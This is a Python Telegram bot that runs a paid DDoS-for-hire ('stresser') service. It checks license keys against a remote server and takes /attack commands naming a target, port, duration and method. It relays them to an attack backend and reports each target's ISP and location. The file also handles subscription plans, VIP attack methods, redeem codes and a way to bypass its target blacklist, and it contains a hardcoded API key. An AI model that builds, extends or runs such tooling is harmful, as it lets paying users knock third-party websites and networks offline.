from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, CallbackContext
from uuid import uuid4
import json
from datetime import datetime, timedelta
import asyncio
import aiohttp
import httpx
from pytz import timezone
import pytz
import random
import string
from functions import helpme_command
import requests

with open('config.json', 'r') as f:
    config = json.load(f)
licensekey = config['licensekey']  # Get this from a config file
product = "stresser"
api_key = "G1gje4OBpsAr5gpkqvEgAiRHdumxIGUo"
url = "https://89.213.158.173:3000/api/client"

headers = {'Authorization': api_key}
data = {'licensekey': licensekey, 'product': product }
response = requests.post(url, headers=headers, json=data)
status = response.json()
if status['status_overview'] == "success":
    print("Your license key is valid!", licensekey)
else:
    print("Your license key is invalid!", licensekey)
    print("Create a ticket in our discord server to get one. discord.gg/BOTFR or @royaloakap")
    exit()

BOT_TOKEN = config['BOT_TOKEN']
api_link = config.get('Api_Link', '')
api_username = config.get('Api_Username', '')
api_passwd = config.get('Api_Passwd', '')

# Utiliser les valeurs dans l'URL de l'API
api_url = f"{api_link}attack?user={api_username}&key={api_passwd}&host={{host}}&port={{port}}&time={{time}}&method={{method}}"

# Ajouter l'URL à la liste des APIs
apis = [api_url]
vietnam_tz = timezone('Asia/Ho_Chi_Minh')
current_time_vietnam = datetime.now(pytz.utc).astimezone(vietnam_tz)
formatted_date = current_time_vietnam.strftime('%H:%M %d-%m-%Y')


ADMIN_IDS = config['ADMIN_IDS']
from functions import ban_user, unban_user, blacklist_command,running_command,method_command,list_banned,plan,stresser,add_user,buy,store,handle_callback,promote_vip_users,handle_ping_command


def extract_domain(target):
    target = target.replace("http://", "").replace("https://", "")
    parts = target.split("/")
    domain = parts[0]
    return domain

async def get_ip_info(target):
    api_url = f"http://ip-api.com/json/{target}"

    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(api_url)
            response.raise_for_status()
            data = response.json()
            if data["status"] == "success":
                isp = data.get("isp")
                city = data.get("city")
                organization = data.get("org")
                country = data.get("country")
                return isp, city, organization, country
            else:
                return None, None, None, None
        except httpx.HTTPStatusError as e:
            print(f"HTTP error occurred: {e}")
            return None, None, None, None
        except httpx.RequestError as e:
            print(f"Request error occurred: {e}")
            return None, None, None, None


async def send_to_webhook(full_name, url, time, port, method, formatted_date, running_attacks, conc, isp, city, organization, country):
  bot_token = config['bot_token']
  chat_id = config['chat_id'] 
  text = (
      f"```\n"
      f"𝗨𝘀𝗲𝗿: {full_name}\n"
      f"| 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n"
      f"     • 𝗧𝗮𝗿𝗴𝗲𝘁: {url}\n"
      f"     • 𝗣𝗼𝗿𝘁: {port}\n"
      f"     • 𝗧𝗶𝗺𝗲: {time}\n"
      f"     • 𝗠𝗲𝘁𝗵𝗼𝗱: {method}\n"
      f"     • 𝗗𝗮𝘁𝗲: {formatted_date}\n"
      f"     • 𝗥𝘂𝗻𝗻𝗶𝗻𝗴: {running_attacks}/{conc}\n"
      f"| 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗻𝗳𝗼𝗺𝗮𝘁𝗶𝗼𝗻:\n"
      f"     • 𝗜𝗦𝗣: {isp}\n"
      f"     • 𝗢𝗿𝗴𝗮𝗻𝗶𝘇𝗮𝘁𝗶𝗼𝗻: {organization}\n"
      f"     • 𝗖𝗶𝘁𝘆: {city}\n"
      f"     • 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}"
      f"```"
  )

  url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
  payload = {
      "chat_id": chat_id,
      "text": text,
      "parse_mode": "MarkdownV2"
  }

  async with httpx.AsyncClient() as client:
      try:
          response = await client.post(url, json=payload)
          response.raise_for_status()
      except httpx.HTTPStatusError as e:
          print(f"HTTP error occurred: {e}")  
      except httpx.RequestError as e:
          print(f"Request error occurred: {e}") 


async def call_api(target, time, port, method, apis):
    async with aiohttp.ClientSession() as session:
        for api_template in apis:
            api_url = None
            try:
                api_url = api_template.format(host=target, port=port, time=time, method=method)
                async with session.get(api_url) as response:
                    response.raise_for_status()
            except aiohttp.ClientResponseError as e:
                print(f"HTTP error occurred at {api_url}: {e}")
            except aiohttp.ClientError as e:
                print(f"Request error occurred at {api_url}: {e}")
            except Exception as e:
                print(f"An error occurred at {api_url}: {e}")
    return
      


def load_methods():
  with open('methods.json', 'r') as file:
      return json.load(file)

def load_user_plans():
  with open('users.json', 'r') as file:
      return json.load(file)


async def handle_attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_plans = load_user_plans()
    user_plan = user_plans.get(str(user_id))

    if not user_plan or datetime.now() > datetime.fromisoformat(user_plan['expire']):
        await update.message.reply_text("Your Plan does not exist\nContact <b>@Royaloakap_bot</b> for buying Plan",parse_mode="HTML")
        return

    if user_plan.get('banned', False):
        await update.message.reply_text("You are banned from using Royal service")
        return

    args = context.args
    if len(args) != 4:
        await update.message.reply_text("Usage: /attack [target] [port] [time] [method]\nE.g: <code> /attack http://example.com/ 80 60 HTTP-RDM</code>",parse_mode="HTML")
        return

    target, port, time, method_name = args
    try:
        time = int(time)
        port = int(port)
    except ValueError:
        await update.message.reply_text("'time' and 'port' values must be numbers.")
        return

    if time > user_plan['time']:
        await update.message.reply_text(f"Your Plan: <b>{user_plan['time']}s</b>",parse_mode="HTML")
        return

    running_attacks_count = count_running_attacks(user_id)
    conc = user_plan['concurrent']
    if running_attacks_count >= int(conc):
        await update.message.reply_text(f"Your Running: <b>{running_attacks_count}/{conc}</b>",parse_mode="HTML")
        return

    current_time = datetime.utcnow()
    last_attack_time = datetime.fromisoformat(user_plan.get('last_attack')) if user_plan.get('last_attack') else None
    cooldown_period = timedelta(seconds=user_plan['cooldown'])

    if last_attack_time and current_time - last_attack_time < cooldown_period:
        remaining_cooldown = cooldown_period - (current_time - last_attack_time)
        await update.message.reply_text(f"Please wait {remaining_cooldown.total_seconds():.0f} second before performing another attack")
        return

    with open('blacklist.json', 'r') as file:
        blacklist = json.load(file)

    is_vip = user_plan.get('vip', False)
    
    if any(blacklisted in target for blacklisted in blacklist) or target.endswith('.gov') or target.endswith('.edu'):
        if not user_plan.get('bypass_blacklist', False):
            await update.message.reply_text(f"Target <b>{target}</b> is blacklisted", parse_mode="HTML")
            return
    
    methods = load_methods()
    method = next((m for m in methods if m['name'] == method_name), None)
    if not method:
        await update.message.reply_text("Invalid attack method")
        return

    if method['vip'] and not is_vip:
        await update.message.reply_text(f"Method <b>{method_name}</b> is available only for VIP users", parse_mode="HTML")
        return

    full_name = update.effective_user.full_name
    attack_id = await start_attack(user_id, target, time, port, method_name)
    check_host_url = f"https://check-host.net/check-http?host={target}"
    button = InlineKeyboardButton(text="Check Host 🔎", url=check_host_url)
    markup = InlineKeyboardMarkup([[button]])
    await call_api(target, time, port, method_name, apis)

    user_plans[str(user_id)]['last_attack'] = current_time.isoformat()
    with open('users.json', 'w') as file:
        json.dump(user_plans, file, indent=4)


    running_attacks = count_running_attacks(user_id)
    isp, city, organization, country = await get_ip_info(extract_domain(target))
    
    reply_text = (
        f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗗: {attack_id}\n"
        f"| 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n"
        f"     • 𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n"
        f"     • 𝗣𝗼𝗿𝘁: {port}\n"
        f"     • 𝗧𝗶𝗺𝗲: {time}\n"
        f"     • 𝗠𝗲𝘁𝗵𝗼𝗱: {method_name}\n"
        f"     • 𝗗𝗮𝘁𝗲: {formatted_date}\n"
        f"     • 𝗥𝘂𝗻𝗻𝗶𝗻𝗴: {running_attacks}/{conc}\n"
        f"| 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗻𝗳𝗼𝗺𝗮𝘁𝗶𝗼𝗻:\n"
        f"     • 𝗜𝗦𝗣: {isp}\n"
        f"     • 𝗢𝗿𝗴𝗮𝗻𝗶𝘇𝗮𝘁𝗶𝗼𝗻: {organization}\n"
        f"     • 𝗖𝗶𝘁𝘆: {city}\n"
        f"     • 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}"
    )

    await update.message.reply_text(f"<pre>{reply_text}</pre>", parse_mode='HTML', reply_markup=markup)
    await send_to_webhook(full_name, target, time, port, method_name, formatted_date, running_attacks, conc, isp, city, organization, country)
      

async def start_attack(user_id, url, time, port, method_name):
    with open('running.json', 'r+') as file:
        try:
            running_attacks = json.load(file)
        except json.JSONDecodeError:
            running_attacks = {}

        end_time = datetime.utcnow() + timedelta(seconds=int(time))
        attack_id = str(uuid4())

        running_attacks[attack_id] = {
            "user_id": user_id,
            "url": url,
            "time": time,
            "port": port,
            "method_name": method_name,
            "end_time": end_time.isoformat()
        }

        file.seek(0)
        json.dump(running_attacks, file, indent=4)
        file.truncate()

    asyncio.create_task(end_attack(attack_id, time))

    return attack_id

async def end_attack(attack_id, delay):
  await asyncio.sleep(int(delay))
  with open('running.json', 'r+') as file:
      running_attacks = json.load(file)
      if attack_id in running_attacks:
          del running_attacks[attack_id]

      file.seek(0)
      json.dump(running_attacks, file, indent=4)
      file.truncate()


def count_running_attacks(user_id):
  with open('running.json', 'r') as file:
      try:
          running_attacks = json.load(file)
      except json.JSONDecodeError:
          return 0  

      current_time = datetime.utcnow()
      count = 0
      for attack in running_attacks.values():
          if attack['user_id'] == user_id and datetime.fromisoformat(attack['end_time']) > current_time:
              count += 1

      return count
      

REDEEM_CODES_FILE = 'redeem_code.json'
USERS_FILE = 'users.json'

# Function to load redeem codes from the file
def load_redeem_codes():
    try:
        with open(REDEEM_CODES_FILE, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

# Function to save redeem codes to the file
def save_redeem_codes(codes):
    with open(REDEEM_CODES_FILE, 'w') as file:
        json.dump(codes, file, indent=4)


# Function to save user plans to the file
def save_user_plans(user_plans):
    with open(USERS_FILE, 'w') as file:
        json.dump(user_plans, file, indent=4)


def generate_random_code(length=10):
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


# Command to handle redeem code actions
async def redeem_command(update: Update, context: CallbackContext):
    user = update.effective_user
    args = context.args

    if not args:
        await update.message.reply_text("Usage: /redeem [add/list/rm/use] [code] [attributes...]")
        return

    action = args[0].lower()
    redeem_codes = load_redeem_codes()
    user_plans = load_user_plans()

    if action == 'add':
        if len(args) < 9:
            code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
            args.insert(1, code)

        if len(args) < 9:
            await update.message.reply_text("Usage: /redeem add [code] [time] [concurrent] [vip] [bypass_blacklist] [cooldown] [expire_days] [uses_left]")
            return

        code = args[1]
        if code in redeem_codes:
            await update.message.reply_text(f"Code {code} already exists.")
            return

        try:
            redeem_codes[code] = {
                "time": int(args[2]),
                "concurrent": int(args[3]),
                "vip": args[4].lower() == 'true',
                "bypass_blacklist": args[5].lower() == 'true',
                "cooldown": int(args[6]),
                "expire_days": int(args[7]),
                "uses_left": int(args[8])
            }
        except ValueError:
            await update.message.reply_text("Invalid value for time, concurrent, cooldown, expire_days, or uses_left. They must be integers.")
            return

        save_redeem_codes(redeem_codes)
        await update.message.reply_text(f"Code {code} added successfully.")


    elif action == 'list':
        if not redeem_codes:
            await update.message.reply_text("No redeem codes available.")
            return

        codes_list = "\n".join([f"{code}: {attrs}" for code, attrs in redeem_codes.items()])
        await update.message.reply_text(f"Redeem Codes:\n{codes_list}")

    elif action == 'rm':
        if len(args) != 2:
            await update.message.reply_text("Usage: /redeem rm [code]")
            return

        code = args[1]
        if code not in redeem_codes:
            await update.message.reply_text(f"Code {code} does not exist.")
            return

        del redeem_codes[code]
        save_redeem_codes(redeem_codes)
        await update.message.reply_text(f"Code {code} removed successfully.")

    elif action == 'use':
        if len(args) != 2:
            await update.message.reply_text("Usage: /redeem use [code]")
            return

        code = args[1]
        if code not in redeem_codes:
            await update.message.reply_text(f"Code {code} does not exist.")
            return

        redeem_code = redeem_codes[code]

        if redeem_code['uses_left'] <= 0:
            await update.message.reply_text(f"Code {code} has no uses left.")
            return

        user_id = str(user.id)
        user_plan = user_plans.get(user_id, {
            "time": 0,
            "concurrent": 0,
            "vip": False,
            "expire": None,
            "banned": False,
            "bypass_blacklist": False,
            "cooldown": 0,
            "last_attack": None
        })


        user_plan['time'] = max(user_plan['time'], redeem_code['time'])
        user_plan['concurrent'] = max(user_plan['concurrent'], redeem_code['concurrent'])
        user_plan['vip'] = user_plan['vip'] or redeem_code['vip']
        user_plan['bypass_blacklist'] = user_plan['bypass_blacklist'] or redeem_code['bypass_blacklist']
        user_plan['cooldown'] = max(user_plan['cooldown'], redeem_code['cooldown'])


        new_expire_date = datetime.now() + timedelta(days=redeem_code['expire_days'])
        if user_plan['expire']:
            try:
                user_expire = datetime.fromisoformat(user_plan['expire'])
            except ValueError:
                user_expire = datetime.min

            user_plan['expire'] = (user_expire if user_expire > new_expire_date else new_expire_date).isoformat()
        else:
            user_plan['expire'] = new_expire_date.isoformat()

        user_plans[user_id] = user_plan
        save_user_plans(user_plans)


        redeem_code['uses_left'] -= 1
        if redeem_code['uses_left'] <= 0:
            del redeem_codes[code]
        else:
            redeem_codes[code] = redeem_code

        save_redeem_codes(redeem_codes)

        await update.message.reply_text(f"Code {code} applied successfully. Uses left: {redeem_code.get('uses_left', 0)}")
    else:
        await update.message.reply_text("Invalid action. Use one of [add/list/rm/use].")



app = ApplicationBuilder().token(BOT_TOKEN).build()


app.add_handler(CommandHandler("attack", handle_attack_command))
app.add_handler(CommandHandler("bl", blacklist_command))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("ban", ban_user))
app.add_handler(CommandHandler("unban", unban_user))
app.add_handler(CommandHandler("running", running_command))
app.add_handler(CommandHandler("method", method_command))
app.add_handler(CommandHandler("listban", list_banned))
app.add_handler(CommandHandler("plan", plan))
app.add_handler(CommandHandler("stresser", stresser))
app.add_handler(CommandHandler("helpme", helpme_command))
app.add_handler(CommandHandler("buy", buy))
app.add_handler(CommandHandler("store", store))
app.add_handler(CallbackQueryHandler(handle_callback))
app.add_handler(CommandHandler("set", promote_vip_users))
app.add_handler(CommandHandler("ping", handle_ping_command))
app.add_handler(CommandHandler("redeem", redeem_command))
print("Running... By Royaloakap")
app.run_polling()
